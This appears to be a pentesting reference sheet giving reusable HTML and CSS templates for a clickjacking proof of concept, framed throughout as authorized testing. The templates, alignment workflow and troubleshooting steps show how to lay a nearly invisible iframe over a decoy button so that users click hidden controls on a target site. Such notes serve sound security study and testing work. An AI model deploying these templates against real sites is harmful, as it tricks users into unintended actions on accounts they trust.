# iframe CSS Clickjacking Template

## Purpose

Reusable CSS template for constructing and aligning a clickjacking iframe and visible decoy in an authorized testing environment.

---

## Basic Template

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# iframe Properties

## Position

```css
position: relative;
```

Controls how the iframe participates in the page layout.

---

## Width

```css
width: 700px;
```

Controls the horizontal size of the target iframe.

---

## Height

```css
height: 500px;
```

Controls the vertical size of the target iframe.

---

## Opacity

During alignment:

```css
opacity: 0.1;
```

For the final PoC:

```css
opacity: 0.0001;
```

---

## z-index

```css
z-index: 2;
```

Controls the iframe's stacking position.

---

# Decoy Properties

Example:

```css
.decoy {
    position: absolute;
    top: 400px;
    left: 80px;
    z-index: 1;
}
```

The following values are target-specific:

```text
top
left
```

---

# Alignment Workflow

```text
Load Target
     ↓
Set opacity = 0.1
     ↓
Locate Target Control
     ↓
Move Decoy
     ↓
Adjust top
     ↓
Adjust left
     ↓
Verify Alignment
     ↓
Set opacity = 0.0001
```

---

# Generic Parameterized Template

```html
<style>
    iframe {
        position: relative;
        width: WIDTHpx;
        height: HEIGHTpx;
        opacity: OPACITY;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: TOPpx;
        left: LEFTpx;
        z-index: 1;
    }
</style>

<div class="decoy">DECOY TEXT</div>

<iframe src="TARGET"></iframe>
```

Replace:

```text
WIDTH
HEIGHT
OPACITY
TOP
LEFT
DECOY TEXT
TARGET
```

with values appropriate for the authorized test.

---

# Useful CSS Variables

| Property | Purpose |
|---|---|
| `position` | Controls element positioning |
| `width` | Controls iframe width |
| `height` | Controls iframe height |
| `opacity` | Controls iframe visibility |
| `top` | Controls vertical placement |
| `left` | Controls horizontal placement |
| `z-index` | Controls stacking order |

---

# Debugging Template

Use a visible iframe while aligning:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
        border: 1px solid;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

The border can make the decoy easier to identify during local testing.

---

# Final Template

After alignment:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# Troubleshooting

## Target Not Visible

Temporarily change:

```css
opacity: 0.0001;
```

to:

```css
opacity: 0.1;
```

---

## Decoy Misaligned

Adjust:

```css
top
left
```

---

## Incorrect Interaction Layer

Check:

```css
z-index: 2;
```

for the iframe and:

```css
z-index: 1;
```

for the decoy.

---

## iframe Dimensions Incorrect

Adjust:

```css
width
height
```

to match the target interface.

---

# Final Checklist

```text
☐ Target is authorized
☐ iframe loads
☐ Width is correct
☐ Height is correct
☐ Target control identified
☐ Decoy created
☐ Decoy positioned correctly
☐ z-index verified
☐ Partial opacity used during alignment
☐ Final opacity configured
☐ Interaction verified
```

---

# Key Learning

The CSS portion of a clickjacking PoC is primarily responsible for:

```text
Positioning
    +
Sizing
    +
Layering
    +
Visibility
```

The target-specific values must be determined during authorized testing rather than assumed to work universally.